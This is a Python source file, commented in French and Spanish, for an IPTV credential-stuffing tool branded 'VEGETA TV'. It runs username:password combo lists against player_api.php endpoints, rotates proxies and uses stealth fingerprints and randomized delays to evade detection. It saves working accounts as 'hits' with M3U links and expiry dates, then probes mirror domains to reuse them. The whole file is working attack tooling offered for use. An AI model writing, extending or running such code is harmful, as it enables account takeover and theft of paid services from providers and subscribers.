    for u in urls:
        try:
            r = _get_with_retry(u, server=server_hostport, timeout=timeout)
            if r is not None and getattr(r, "status_code", 0) == 200 and r.content:
                txt = _safe_text(r.content)
                if "#EXTM3U" in txt or "#EXTINF" in txt:
                    return txt
        except Exception:
            pass
    return None

_GROUP_TITLE_RE   = re.compile(r'group-title\s*=\s*"(.*?)"', re.IGNORECASE)
_GENERIC_CAT_RE   = re.compile(r'^\s*category\s+\d+\s*$', re.IGNORECASE)

def _filter_generic_categories(names):
    """
    Enlève les fausses catégories du type 'Category 41'.
    """
    out = []
    for n in names or []:
        s = str(n or "").strip()
        if not s:
            continue
        if _GENERIC_CAT_RE.match(s):
            # on ignore 'Category 41', 'category 92', etc.
            continue
        out.append(s)
    return out

def extract_categories_from_m3u(m3u_text, limit=None):
    """
    Extrait les catégories (#EXTINF ... group-title="...") en liste unique (ordre d’apparition).
    """
    if not m3u_text:
        return []
    seen, cats = set(), []
    for line in m3u_text.splitlines():
        if "#EXTINF" not in line:
            continue
        m = _GROUP_TITLE_RE.search(line)
        if not m:
            continue
        cat = m.group(1).strip()
        if cat and cat not in seen:
            seen.add(cat)
            cats.append(cat)
            if limit and len(cats) >= limit:
                break
    # ici normalement on a déjà de “vrais” noms (LATINO, USA, FRANCE…)
    return cats

def get_categories_with_fallback(server_hostport, user, pwd, timeout=4, limit=None):
    """
    1) player_api get_live_categories
    2) player_api get_live_streams -> category_name (SANS 'Category 41')
    3) GET M3U (fallback) -> group-title
    Retourne une LISTE de noms de catégories lisibles.
    """
    # 1) API: get_live_categories
    try:
        url = f"http://{server_hostport}/player_api.php?action=get_live_categories&username={user}&password={pwd}"
        data = fetch_json(url, timeout=timeout, server=server_hostport)
        if isinstance(data, list) and data:
            out, seen = [], set()
            for it in data:
                name = str(it.get("category_name") or "").strip()
                if not name:
                    continue
                # on ignore aussi ici si c’est déjà de la forme 'Category 41'
                if _GENERIC_CAT_RE.match(name):
                    continue
                if name not in seen:
                    seen.add(name)
                    out.append(name)
                    if limit and len(out) >= limit:
                        return out
            if out:
                return out
    except Exception:
        pass

    # 2) API: get_live_streams (déduire les noms, mais uniquement lisibles)
    try:
        url = f"http://{server_hostport}/player_api.php?action=get_live_streams&username={user}&password={pwd}"
        data = fetch_json(url, timeout=timeout, server=server_hostport)
        if isinstance(data, list) and data:
            out, seen = [], set()
            for it in data:
                name = str(it.get("category_name") or "").strip()
                # ⚠️ on NE crée plus du tout 'Category {id}' à partir de category_id
                if not name:
                    continue
                if _GENERIC_CAT_RE.match(name):
                    continue
                if name not in seen:
                    seen.add(name)
                    out.append(name)
                    if limit and len(out) >= limit:
                        return out
            if out:
                return out
    except Exception:
        pass

    # 3) Fallback: GET M3U (group-title)
    try:
        m3u = download_m3u_text(server_hostport, user, pwd, timeout=max(2, timeout))
        cats = extract_categories_from_m3u(m3u, limit=limit)
        cats = _filter_generic_categories(cats)
        if cats:
            return cats
    except Exception:
        pass

    return []

# ===================== CATEGORIES =====================
def get_tv_categories(server, user, pwd):
    """
    Renvoie les catégories (chaîne jointe) :
    1) tente player_api get_live_categories
    2) sinon player_api get_live_streams (noms lisibles uniquement)
    3) sinon fallback GET M3U (group-title)
    """
    try:
        names = get_categories_with_fallback(server, user, pwd, timeout=8, limit=None)
        if not names:
            return "Aucune catégorie trouvée"
        return ", ".join(names)
    except Exception:
        return "Erreur récupération catégories"
                             
# ===================== PANEL (fixe en haut) =====================
def render_panel(combo_name: str, stats: dict, total_checks: int, server_hits: dict):
    """Panel fijo en la parte superior con progreso de dominios por servidor (agregado)."""
    global _panel_index, _blink_index, _spin_index, _last_hit_message
    # + états UI proxy + statut serveur
    global PROXY_FILE_NAME, PROXIES_TOTAL, PROXIES_USED_SET, CURRENT_PROXY_DISPLAY
    global _SERVER_HTTP_STATUS, _SERVER_HTTP_STATUS_LOCK
    try:
        progresso = stats['checks'] / total_checks if total_checks else 0.0
        elapsed = int(time.time() - _start)
        tempo_str = time.strftime('%H:%M:%S', time.gmtime(elapsed))
        cpm = stats.get('cpm', 0.0)
        ranked = sorted(server_hits.items(), key=lambda x: x[1], reverse=True)

        # === Statuts HTTP des serveurs (max 2) ===
        status_blocks = []
        try:
            with _SERVER_HTTP_STATUS_LOCK:
                local_status = dict(_SERVER_HTTP_STATUS)

            # on affiche au maximum les 2 serveurs principaux
            for srv, _hits in ranked[:2]:
                txt = local_status.get(srv, "UNKNOWN") or "UNKNOWN"
                t_up = txt.upper()

                # couleur selon le statut
                if "ONLINE" in t_up or "200" in t_up:
                    col = '\x1b[1;32m'   # vert
                elif "REDIRECT" in t_up:
                    col = '\x1b[1;33m'   # jaune
                elif "PROTECTED" in t_up:
                    col = '\x1b[1;35m'   # magenta
                elif "ERROR" in t_up or "OFFLINE" in t_up:
                    col = '\x1b[1;31m'   # rouge
                else:
                    col = '\x1b[37m'     # gris

                # numéro d'escaneo (#1 / #2)
                idx = SERVER_INDEX.get(srv)
                if idx:
                    label = f"#{idx} {txt}"
                else:
                    label = txt

                status_blocks.append(f"{col}[{label}]\x1b[0m")

            if not status_blocks:
                status_blocks.append("\x1b[37m[—]\x1b[0m")
        except Exception:
            status_blocks = ["\x1b[37m[—]\x1b[0m"]

        statuses_str = " ".join(status_blocks)

        # Couleurs globales
        main_color  = '\x1b[96m'  # azul cielo vivo
        _panel_index += 1
        _blink_index += 1

        # Spinner independiente con color cíclico
        spin = _SPIN[_spin_index % len(_SPIN)]
        spin_color = _colors[_spin_index % len(_colors)]
        _spin_index += 1

        # ====== Agregación de escaneos paralelos ======
        with _RESULTS_LOCK:
            scans = list(PARALLEL_SCANS.values())
            num_scans = sum(1 for s in scans if s.started.is_set())
            total = sum(s.total for s in scans)
            done  = sum(s.done  for s in scans)

            found_set = []
            for s in scans:
                found_set.extend(s.results)
            found = len(set(found_set))

            live = []
            for s in scans:
                live.extend(s.live)
            live = list(dict.fromkeys(live))[-_PARALLEL_LIVE_MAX:]

        if num_scans == 0:
            state = "Inactivo"
        elif any(s.started.is_set() and not s.finished.is_set() for s in scans):
            state = "En curso"
        else:
            state = "Terminado"

        prog = (done / total) if total else 0.0

        buf = []
        # Título/logo
        buf.append('\x1b[1;33m' + VEGETA_ASCII + '\x1b[0m')
        buf.append(
            f'{main_color}┏━VΞGΞТΛ⚡₸V '
            f'{spin_color}{spin}\x1b[0m'
            f'{main_color}━━━━━━━━━━━━━━━━━━━━━━┓\x1b[0m'
        )
        buf.append(f'{main_color}┣⚡Combo Actual ➜ \x1b[1m{combo_name}\x1b[0m')

        # === Progression COMBO ===
        buf.append(
            f'{main_color}┣⚡Progreso     ➜ '
            f'\x1b[1;33m{progresso*100:6.2f}%\x1b[0m'
        )
        buf.append(
            f'{main_color}┣⚡[{_bar(progresso, 16)}] '
            f'(\x1b[1;33m{stats["checks"]}\x1b[0m{main_color}/{total_checks})\x1b[0m'
        )

        # === LÍNEA PROXY ===
        try:
            used = len(PROXIES_USED_SET)
            totalp = PROXIES_TOTAL
            curp = CURRENT_PROXY_DISPLAY
            pf = PROXY_FILE_NAME
        except Exception:
            used, totalp, curp, pf = 0, 0, "—", "Aucun"
        buf.append(
            f"{main_color}┣⚡Proxy ➜ \x1b[1m{curp}\x1b[0m   "
            f"{main_color}(\x1b[1;33m{used}\x1b[0m{main_color}/\x1b[1;33m{totalp}\x1b[0m{main_color} )"
        )

        # === CPM (seul) ===
        buf.append(
            f'{main_color}┣⚡CPM ➜ {int(cpm)}   {spin_color}{spin}\x1b[0m'
        )

        # === NOUVELLE LIGNE STATUS ===
        buf.append(
            f'{main_color}┣⚡{statuses_str}\x1b[0m'
        )

        buf.append(f'{main_color}┣⚡Tiempo Activo ➜ {tempo_str} \x1b[0m')

        # === Controles teclado ===
        buf.append(f'{main_color}┣🛑 Pulsa "\x1b[1;31m𝗙 \x1b[0m{main_color}para finalizar todo\x1b[0m')
        buf.append(f'{main_color}┣🛑 Pulsa "\x1b[1;31m𝗩 \x1b[0m{main_color}para detener solo los dominios paralelos\x1b[0m')

        # États des arrêts sélectifs
        s1_stopped = _stop_combos_s1.is_set()
        s2_stopped = _stop_combos_s2.is_set()

        if s1_stopped:
            buf.append(f'{main_color}┣⛔ Escaneo #1: \x1b[1;31mCOMBOS DETENIDOS\x1b[0m')
        else:
            buf.append(f'{main_color}┣🛑 Pulsa "\x1b[1;31m𝟭 \x1b[0m{main_color}para detener combos del Escaneo #1\x1b[0m')

        if s2_stopped:
            buf.append(f'{main_color}┣⛔ Escaneo #2: \x1b[1;31mCOMBOS DETENIDOS\x1b[0m')
        else:
            buf.append(f'{main_color}┣🛑 Pulsa "\x1b[1;31m𝟮 \x1b[0m{main_color}para detener combos del Escaneo #2\x1b[0m')

        # === Pause / Resume general ===
        reset = '\x1b[0m'
        if _pause_scan.is_set():
            buf.append(f'{main_color}┣⏸️ Pausa general ACTIVADA — pulsa \x1b[92m 𝗘{reset}{main_color} para reanudar el escaneo{reset}')
        else:
            buf.append(f'{main_color}┣▶️ Pulsa \x1b[93m 𝗣{reset}{main_color} para una pausa general{reset}')

        # === Dominios paralelos ===
        buf.append(f'{main_color}┣🌍 Dominios paralelos: {state}\x1b[0m')
        if total > 0:
            buf.append(
                f'{main_color}┃   Scans: \x1b[1;33m{num_scans}\x1b[0m{main_color}  '
                f'Progreso ➜ \x1b[1;33m{prog*100:6.2f}%\x1b[0m'
            )
            buf.append(
                f'{main_color}┣⚡[{_bar(prog, 16)}] '
                f'(\x1b[1;33m{done}\x1b[0m{main_color}/{total})   🌎 '
                f'\x1b[1;33m{found}\x1b[0m'
            )
        else:
            buf.append(f'{main_color}┃   (inicia con el primer hit de cada servidor)\x1b[0m')

        if live:
            for d in live:
                buf.append(f'{main_color}┃   ✅ \x1b[1;96m{d}\x1b[0m')
        else:
            if state == "En curso":
                buf.append(f'{main_color}┃   (escaneo en curso…)\x1b[0m')
            elif state == "Terminado":
                buf.append(f'{main_color}┃   Ningún dominio activo encontrado\x1b[0m')

        # === Ranking de servidores ===
        if ranked:
            buf.append(f'{main_color}┣⚡Ranking de Servidores━━━━━━━━━━━━━━┓\x1b[0m')
            for pos, (srv, q) in enumerate(ranked, 1):
                mirrors = 0
                st = PARALLEL_SCANS.get(srv)
                if st:
                    mirrors = len(set(st.results))
                buf.append(
                    f'{main_color}┃ {pos:>2}. {srv:<25} '
                    f'\x1b[1;33m{q}\x1b[0m{main_color} hit(s)   '
                    f'┣🌍 \x1b[1;33m{mirrors}\x1b[0m{main_color} mirrors\x1b[0m'
                )
            buf.append(f'{main_color}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛   \x1b[0m')
        else:
            buf.append(f'{main_color}┣⚡Ningún hit por el momento\x1b[0m')

        # === Cascade: últimos 5 hits ===
        if HIT_CASCADE:
            buf.append("")
            for line in list(HIT_CASCADE):
                line_colored = line.replace("|", "\x1b[36m|\x1b[90m")
                buf.append(f'\x1b[90m🎯 {line_colored}\x1b[0m')

        with _display_lock:
            sys.stdout.write("\033[H\033[J")
            sys.stdout.write("\n".join(buf) + "\n")
            sys.stdout.write("\x1b[0m")
            sys.stdout.flush()
    except Exception as e:
        with _display_lock:
            sys.stdout.write(f"\n\x1b[1;31mError en render_panel: {e}\x1b[0m\n")
            sys.stdout.flush()
            
def _render_hit_text_now(hit_id: str) -> str:
    """
    Construit le TEXTE d'UN hit à partir de son id (server__user),
    avec insertion (max 5) des domaines parallèles du serveur correspondant.
    """
    hit = HITS_BY_ID.get(hit_id)
    if not hit:
        return ""

    server = hit["server"]
    lines = hit["base_text"].splitlines()

    # Parallèles courants pour CE serveur
    st = PARALLEL_SCANS.get(server)
    per_server_parallels = sorted(set(st.results)) if (st and st.results) else []
    per_server_parallels_for_hit = per_server_parallels[:5]  # <= max 5 dans le TEXTE HIT

    # Construire le bloc "Dominios Paralelos Activos" (max 5)
    if per_server_parallels_for_hit:
        dom_block_lines = ["┣🌍Dominios Paralelos Activos:"]
        dom_block_lines += [f"┣✅ {p}" for p in per_server_parallels_for_hit]
    else:
        dom_block_lines = []  # pas de bloc si aucun miroir

    def find_idx(prefix):
        return next((i for i, ln in enumerate(lines) if ln.strip().startswith(prefix)), None)

    idx_ubicacion = find_idx("┣🗺️Ubicación")
    idx_puerto    = find_idx("┣🚀Puerto")
    idx_ip        = find_idx("┣📍IP")
    idx_real_srv  = find_idx("┣🌐 Servidor Real")

    if idx_ubicacion is not None and idx_puerto is not None and idx_puerto > idx_ubicacion:
        insert_idx = idx_puerto
    elif idx_ubicacion is not None:
        insert_idx = idx_ubicacion + 1
    elif idx_ip is not None:
        insert_idx = idx_ip + 1
    elif idx_real_srv is not None:
        insert_idx = idx_real_srv + 1
    elif idx_puerto is not None:
        insert_idx = idx_puerto
    else:
        insert_idx = min(1, len(lines))

    # Retirer l’ancien bloc (si existait), puis insérer le nouveau
    if any("Dominios Paralelos Activos" in ln for ln in lines):
        new_lines, skip = [], False
        for ln in lines:
            if "Dominios Paralelos Activos" in ln:
                skip = True
                continue
            if skip:
                if ln.startswith("┣") or ln.startswith("┗"):
                    new_lines.append(ln)  # fin du bloc parallèles
                    skip = False
                else:
                    continue
            else:
                new_lines.append(ln)
        lines = new_lines

    if dom_block_lines:
        # recalcul (le tableau a changé)
        def f2(prefix):
            return next((i for i, ln in enumerate(lines) if ln.strip().startswith(prefix)), None)
        idx_ubicacion = f2("┣🗺️Ubicación")
        idx_puerto    = f2("┣🚀Puerto")
        idx_ip        = f2("┣📍IP")
        idx_real_srv  = f2("┣🌐 Servidor Real")
        if idx_ubicacion is not None and idx_puerto is not None and idx_puerto > idx_ubicacion:
            insert_idx = idx_puerto
        elif idx_ubicacion is not None:
            insert_idx = idx_ubicacion + 1
        elif idx_ip is not None:
            insert_idx = idx_ip + 1
        elif idx_real_srv is not None:
            insert_idx = idx_real_srv + 1
        elif idx_puerto is not None:
            insert_idx = idx_puerto
        else:
            insert_idx = min(1, len(lines))

        lines[insert_idx:insert_idx] = dom_block_lines

    final_txt = "\n".join(lines)
    if not final_txt.rstrip().endswith("┗━━━━━━━━━━━━━━━━━━━━⚡"):
        final_txt = final_txt.rstrip() + "\n┗━━━━━━━━━━━━━━━━━━━━⚡\n"
    return final_txt


def _render_server_text_now(server: str) -> str:
    """
    Concatène les blocs de TOUS les hits d’un même serveur,
    chacun rendu via _render_hit_text_now(hit_id).
    """
    hit_ids = HITS_BY_SERVER.get(server, [])
    blocks = []
    for hit_id in hit_ids:
        try:
            b = _render_hit_text_now(hit_id)
            if b:
                blocks.append(b.rstrip())
        except Exception:
            continue
    return ("\n".join(blocks) + ("\n" if blocks else ""))
    
def _start_emitter():
    def _run():
        while True:
            try:
                action, server = EMIT_Q.get()
            except Exception:
                continue
            try:
                if action in ("hit_update", "server_update"):
                    full_txt = _render_server_text_now(server)
                    if full_txt:
                        safe_name = server.replace(':', '_')
                        save_full_overwrite(safe_name, full_txt)  # un seul fichier par serveur

                    mirrors = len(PARALLEL_SCANS.get(server).results) if PARALLEL_SCANS.get(server) else 0
                    hits = len(HITS_BY_SERVER.get(server, []))

                    # [update] tout en gris (dim), sauf les nombres en vert
                    print(
                        "\x1b[2m[update] " + server +
                        ": hits=\x1b[0m\x1b[1;32m" + str(hits) + "\x1b[0m" +
                        "\x1b[2m, parallels=\x1b[0m\x1b[1;32m" + str(mirrors) + "\x1b[0m"
                    )
            except Exception:
                pass
            finally:
                try:
                    EMIT_Q.task_done()
                except Exception:
                    pass
    threading.Thread(target=_run, daemon=True).start()
                           
# ===================== TEST COMPTE & DÉTAILS (base) =====================
def check_target(server: str, item: tuple, timeout: float = 6.0, retries: int = 0, proxy=None) -> tuple:
    """
    Teste un user:pass sur un serveur IPTV avec proxy optionnel.
    """
    user, pwd = item
    url = f'http://{server}/player_api.php?username={user}&password={pwd}'
    
    for attempt in range(retries + 1):
        try:
            data = fetch_json(url, timeout=_effective_timeout(timeout), server=server, proxy=proxy)
            if not data:
                continue

            status = str(data.get('user_info', {}).get('status', '')).lower()
            if status in ['active', '1', 'true', 'ok']:
                return (True, data)
        except Exception:
            pass

        # 🔄 sur échec → nouvelle empreinte furtive
        init_thread_fingerprint(server, proxy)
    
    return (False, {})
    

def build_hit_base_text(server: str, item: tuple, data: dict) -> dict:
    """Construye la parte común del hit (sin dominios paralelos)."""
    user, pwd = item
    ui = data.get('user_info', {})
    created = _format_ts(ui.get('created_at', ''))
    exp     = _format_ts(ui.get('exp_date',   ''))
    dias    = _days_left(ui.get('exp_date',   ''))
    maxc    = ui.get('max_connections', '1')
    actc    = ui.get('active_cons',     '0')

    host = server.split(':')[0]
    porta = server.split(':')[1] if ':' in server else '80'
    ip = resolve_ip(host)
    geo = geo_lookup(ip) if ip else {}
    geo_txt = describe_geo(geo)
    flag = _country_flag(geo.get("countryCode") or "")

    total_canais, total_filmes, total_series = fetch_counts(server, user, pwd)
    now = datetime.datetime.now().strftime('%d/%m/%Y')
    cats = get_tv_categories(server, user, pwd)
    m3u = f'http://{server}/get.php?username={user}&password={pwd}&type=m3u_plus'

    base_text = f"""\n┏ VEGETA TV
┣Servidor http://{server}
┣ Servidor Real {host}
┣IP {ip or '—'} {flag}
┣Ubicación {geo_txt}
┣Puerto {porta}
┣Estado {ui.get('status', '')}
┣Usuario  {user}
┣Contraseña {pwd}
┣Fecha del Escaneo {now}
┣Creado el {created}
┣Expira el {exp}
┣Días restantes {dias}
┣Conexiones {actc}/{maxc}
┣Enlace M3U {m3u}
┣Categorías {cats}
"""
    return {
        "user": user, "pwd": pwd, "port": porta, "server": server,
        "base_text": base_text
    }

# ===================== RÉSUMÉ FINAL (Domain/IP/Geo/Categories/Mirrors) =====================
def build_final_summary_block(server: str, user: str, pwd: str, mirrors: list) -> str:
    """
    Panel final SANS recalcul réseau :
    - IP / Geo repris du 1er HIT du serveur
    - Catégories prises sur le 1er HIT qui EN A,
      sinon sur BASELINE_CATS (premier hit avec catégories),
      sinon affichage "—".
    """
    try:
        host = server.split(':')[0]

        ip_txt = "—"
        geo_txt = "—"
        cat_names = []
        total_live_txt = "—"  # on n'essaie plus de recalculer

        # 1) Premier hit de ce serveur (pour IP / GEO)
        hit_ids = HITS_BY_SERVER.get(server, [])
        first_hit = HITS_BY_ID.get(hit_ids[0]) if hit_ids else None

        if first_hit:
            bt = first_hit.get("base_text", "")

            # IP (ligne "📍IP➲ ...")
            for line in bt.splitlines():
                s = line.strip()
                if s.startswith("┣📍IP") and "➲" in s:
                    val = s.split("➲", 1)[-1].strip()
                    ip_txt = val.split()[0] if val else "—"
                    break

            # Geo (ligne "🗺️Ubicación➲ ...")
            for line in bt.splitlines():
                s = line.strip()
                if s.startswith("┣🗺️Ubicación") and "➲" in s:
                    geo_txt = s.split("➲", 1)[-1].strip() or "—"
                    break

            # 1ère tentative : catégories venant du texte du 1er hit
            cats_raw = ""
            for line in bt.splitlines():
                s = line.strip()
                if s.startswith("┣📺Categorías") and "➲" in s:
                    cats_raw = s.split("➲", 1)[-1].strip()
                    break
            if cats_raw and cats_raw not in ("Aucune catégorie trouvée", "Erreur récupération catégories"):
                cat_names = [c.strip() for c in cats_raw.split(",") if c.strip()]

        # 2) Si encore vide, on prend les catégories de BASELINE_CATS
        if not cat_names:
            try:
                base_set = BASELINE_CATS.get(server) or set()
                if base_set:
                    cat_names = sorted(base_set)
            except Exception:
                pass

        # 3) Miroirs (déjà collectés)
        mirrors = sorted(set(mirrors or []))
        mirrors_block = "\n".join([f"✅ {m}" for m in mirrors]) if mirrors else "—"

        cats_block = "—" if not cat_names else ("• " + "\n• ".join(cat_names))

        txt = (
            f"📥 Domain : {host}\n"
            f"🌐 IP     : {ip_txt}\n"
            f"📍 Geo    : {geo_txt}\n\n"
            f"📺 IPTV Categories:\n"
            f"━━━━━━━━━━━━━━━\n"
            f"{cats_block}\n\n"
            f"📊 Total channels detected : {total_live_txt}\n\n"
            f"🌐 Mirror panels found:\n"
            f"{mirrors_block}\n"
        )
        return txt
    except Exception as e:
        return f"[Erreur résumé final: {e}]"
        
 # ===================== ANALYSE DOMAINES PARALLÈLES (1x au 1er hit) =====================
def _domain_worker_per_server(key, state, task_q, user, pwd, port, delay_range=(0.05, 0.1)):
    # 🔑 Empreinte fraîche et stable pour CE thread
    init_thread_fingerprint(server=key)

    while not _stop_early.is_set() and not _stop_parallel.is_set():
        # ⏸️ PAUSE GÉNÉRALE : attendre tant que la pause est active
        while _pause_scan.is_set() and not _stop_early.is_set() and not _stop_parallel.is_set():
            time.sleep(0.2)

        # Si on nous a demandé d'arrêter pendant la pause
        if _stop_early.is_set() or _stop_parallel.is_set():
            break

        # Récupère un domaine à tester
        try:
            dom = task_q.get_nowait()
        except queue.Empty:
            break

        # Ce flag dira si on a VRAIMENT traité la tâche (réseau fait)
        counted_done = False

        try:
            # Si la pause arrive juste après avoir pris la tâche,
            # on remet l’item dans la queue pour ne rien “bloquer”.
            if _pause_scan.is_set():
                try:
                    task_q.put_nowait(dom)
                except Exception:
                    pass
                # ❌ PAS de task_done() ici : il sera fait dans le finally.
                # et on NE compte PAS cette tâche dans state.done
                continue

            # ⏩ AUCUNE ATTENTE HUMAINE : on enchaîne direct sur la requête
            if _stop_early.is_set() or _stop_parallel.is_set():
                # ❌ pas de task_done() ici; le finally s’en charge.
                break

            # Re-check pause juste AVANT le réseau
            while _pause_scan.is_set() and not _stop_early.is_set() and not _stop_parallel.is_set():
                time.sleep(0.2)
            if _stop_early.is_set() or _stop_parallel.is_set():
                # ❌ pas de task_done() ici; le finally s’en charge.
                break

            srv = f"{dom}:{port}"
            url = f"http://{srv}/player_api.php?username={user}&password={pwd}"

            # Status check (4s max, réduit si 'V' actif via _effective_timeout)
            data = fetch_json(url, timeout=_effective_timeout(4), server=srv)

            # 👉 À partir d’ici, la tentative est réellement consommée
            counted_done = True

            ok = bool(
                data
                and str(data.get("user_info", {}).get("status", "")).lower()
                in ["active", "1", "true", "ok"]
            )
            if ok:
                # ⚠️ Comparaison de catégories avec la baseline du serveur 'key'
                base_set = BASELINE_CATS.get(key, set())

                # Timeout plus court pour les catégories
                cand_names = get_categories_with_fallback(
                    srv, user, pwd, timeout=_effective_timeout(2), limit=300
                )
                cand_set = _cats_to_set(cand_names)

                if _cats_similar(base_set, cand_set):
                    url_ok = f"http://{srv}"
                    with _RESULTS_LOCK:
                        if url_ok not in state.results:
                            state.results.append(url_ok)

                            # ➜ MAJ du texte HIT si ce serveur a déjà un hit
                            if key in HITS_BY_SERVER:
                                try:
                                    EMIT_Q.put(("hit_update", key), block=False)
                                except Exception:
                                    pass

                        # flux "live" (aperçu)
                        state.live.append(url_ok)
                        if len(state.live) > _PARALLEL_LIVE_MAX:
                            state.live[:] = state.live[-_PARALLEL_LIVE_MAX:]

        except Exception:
            pass
        finally:
            # ✅ Toujours équilibrer la queue
            try:
                task_q.task_done()
            except Exception:
                pass
            # ✅ Mais n'incrémenter l'avancement que si on a vraiment testé ce domaine
            if counted_done:
                with _RESULTS_LOCK:
                    state.done += 1
                                                
def run_parallel_domains_for_server(key, user, pwd, port):
    """
    Démarre DOMAIN_WORKERS threads pour CE serveur (1 seule fois par serveur).
    Non bloquant: lance un 'joiner' en arrière-plan. Si 'V' est pressé,
    on n'attend PAS la fin des threads (pas de join).
    """
    state = PARALLEL_SCANS.setdefault(key, ScanState(key))
    if state.started.is_set():
        return
    state.started.set()

    domains = load_domains()
    state.total = len(domains) if domains else 0
    state.done = 0
    if not domains:
        state.finished.set()
        return

    task_q = queue.Queue()
    for d in domains:
        task_q.put(d)

    state.task_q = task_q   # ✅ mémorise la queue dans l’état pour un arrêt chirurgical

    pool = [
        threading.Thread(
            target=_domain_worker_per_server,
            args=(key, state, task_q, user, pwd, port),
            daemon=True  # ✅ on pourra ignorer ces threads sans bloquer
        )
        for _ in range(int(DOMAIN_WORKERS))
    ]
    for t in pool:
        t.start()

    def _drain_queue(q):
        try:
            while True:
                q.get_nowait()
                q.task_done()
        except queue.Empty:
            pass

    def _joiner():
        try:
            # Boucle d’observation
            while any(t.is_alive() for t in pool):
                if _stop_early.is_set() or _stop_parallel.is_set():
                    # ✅ arrêt immédiat: on vide la file et on termine SANS join
                    _drain_queue(task_q)
                    state.finished.set()
                    return
                time.sleep(0.1)

            # Fin normale: tous les threads morts → on peut join pour nettoyer
            for t in pool:
                t.join()
        finally:
            # S’assure que l’UI passe à “terminé”
            state.finished.set()

    threading.Thread(target=_joiner, daemon=True).start()
                        
def _abort_parallel_group(state, task_q):
    """Arrêt immédiat des domaines parallèles pour UN serveur: coupe, vide, termine UI."""
    _stop_parallel.set()
    # vider la file réelle
    try:
        while True:
            try:
                task_q.get_nowait()
                try: task_q.task_done()
                except Exception: pass
            except queue.Empty:
                break
    except Exception:
        pass
    # marquer fini côté UI
    try: state.finished.set()
    except Exception: pass
    # notifier l'agrégateur si présent
    try: _PARALLEL_DONE.set()
    except Exception: pass                        
# ===================== SAUVEGARDE =====================
def save_full(server_key: str, text: str):
    try:
        os.makedirs(OUT_DIR, exist_ok=True)
        path = os.path.join(OUT_DIR, f'VΞGΞТΛ⚡₸V⟮{server_key}⟯.txt')
        with open(path, 'a', encoding='utf-8', buffering=1) as f:
            f.write(text.strip() + '\n')
            f.flush()
        return True
    except Exception:
        return False
# --- helper: écriture en overwrite pour un fichier HIT ---
def save_full_overwrite(safe_name: str, text: str):
    try:
        os.makedirs(OUT_DIR, exist_ok=True)
    except Exception:
        pass
    # même nommage que save_full, mais on écrase
    path = os.path.join(OUT_DIR, f"VΞGΞТΛ⚡₸V⟮{safe_name}⟯.txt")
    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(text)
        
def save_panels(server_key: str, text: str):
    """Sauvegarde le résumé panels (Domain/IP/Geo/Categories/Mirrors) dans un fichier séparé."""
    try:
        os.makedirs(OUT_DIR, exist_ok=True)
        path = os.path.join(OUT_DIR, f'VΞGΞТΛ⚡₸V•panels•⟮{server_key}⟯.txt')
        with open(path, 'a', encoding='utf-8', buffering=1) as f:
            f.write(text.strip() + '\n')
            f.flush()
        return True
    except Exception:
        return False        
# ===================== WORKER (combos) =====================
def worker(tid, tasks_q, stats, server_hits, combo_name, total_checks,
           stealth_delay=(0.08, 0.02), scan_id=1, proxies_list=None, proxy_kind=None):
    """
    Worker combos avec support proxy + MAJ de l'UI Proxy.
    Version AVEC petit délai "humain" entre chaque requête combo.
    """
    global CURRENT_PROXY_DISPLAY, PROXIES_USED_SET

    # Proxy aléatoire pour ce thread - AVEC proxy_kind
    thread_proxy = get_random_proxy(proxies_list, proxy_kind) if proxies_list else None

    # [PROXY-UI] informer le panel au démarrage
    if proxies_list:
        with _display_lock:
            CURRENT_PROXY_DISPLAY = _mask_proxy(thread_proxy) if thread_proxy else "—"
            if thread_proxy:
                PROXIES_USED_SET.add(CURRENT_PROXY_DISPLAY)

    ROTATE_EVERY = 50
    attempts = 0
    last_draw = 0.0
    consecutive_fail_by_server = {}

    while not _stop_early.is_set():
        _wait_while_paused()   # pause seulement si tu appuies sur P
        if _stop_early.is_set():
            break

        try:
            server, item = tasks_q.get_nowait()
        except queue.Empty:
            break

        if _pause_scan.is_set():
            # si pause activée, on remet la tâche dans la file et on attend
            try:
                tasks_q.put_nowait((server, item))
            except Exception:
                pass
            try:
                tasks_q.task_done()
            except Exception:
                pass
            continue

        if _is_scan_stopped_for_server(server):
            try:
                tasks_q.task_done()
            except Exception:
                pass
            continue

        try:
            # plus de délai furtif global : on vérifie juste les flags d’arrêt
            if _stop_early.is_set() or _stop_combos.is_set():
                break
            _wait_while_paused()
            if _stop_early.is_set():
                break

            # ✅ Initialisation avec proxy
            if getattr(_thread_local, "session_server", None) != server or getattr(_thread_local, "session_proxy", None) != thread_proxy:
                init_thread_fingerprint(server, thread_proxy)

            attempts += 1
            if attempts % ROTATE_EVERY == 0:
                # Rotation de proxy périodique - AVEC proxy_kind
                if proxies_list:
                    thread_proxy = get_random_proxy(proxies_list, proxy_kind)
                    # [PROXY-UI] après rotation périodique
                    with _display_lock:
                        CURRENT_PROXY_DISPLAY = _mask_proxy(thread_proxy) if thread_proxy else "—"
                        if thread_proxy:
                            PROXIES_USED_SET.add(CURRENT_PROXY_DISPLAY)
                init_thread_fingerprint(server, thread_proxy)

            # 💤 Petit délai humain AVANT chaque requête combo
            try:
                if stealth_delay and stealth_delay[0] >= 0 and stealth_delay[1] >= 0:
                    d_min, d_max = stealth_delay
                    if d_max < d_min:
                        d_min, d_max = d_max, d_min
                    delay = random.uniform(d_min, d_max)
                    end = time.time() + delay
                    while time.time() < end:
                        if _stop_early.is_set() or _stop_combos.is_set():
                            break
                        if _pause_scan.is_set():
                            time.sleep(0.1)
                            continue
                        time.sleep(0.05)
            except Exception:
                # si jamais il y a un problème avec stealth_delay, on ne bloque pas le worker
                pass

            if _stop_early.is_set() or _stop_combos.is_set():
                break
            _wait_while_paused()
            if _stop_early.is_set():
                break

            # === test user:pass AVEC PROXY ===
            ok, data = check_target(server, item, proxy=thread_proxy)

            with _display_lock:
                stats['checks'] += 1
                elapsed = max(1e-6, time.time() - stats['start'])
                stats['cpm'] = stats['checks'] / elapsed * 60.0

            if ok:
                consecutive_fail_by_server[server] = 0
                with _display_lock:
                    server_hits[server] = server_hits.get(server, 0) + 1
                    stats['hits'] += 1
                    global _last_hit_message
                    _last_hit_message = f"✅ Hit sur {server}"

                # 🔔 Alarme immédiate sur HIT
                try:
                    hit_alarm()
                except Exception:
                    pass

                hit_info = build_hit_base_text(server, item, data)

                # ✅ Sauvegarde du combo HIT dans VΞGΞТΛ⚡₸V/COMBO/<domaine>.txt
                try:
                    save_combo_for_server(
                        server,
                        hit_info.get("user", ""),
                        hit_info.get("pwd", "")
                    )
                except Exception:
                    pass

                # --- cascade live des hits dans le panneau ---
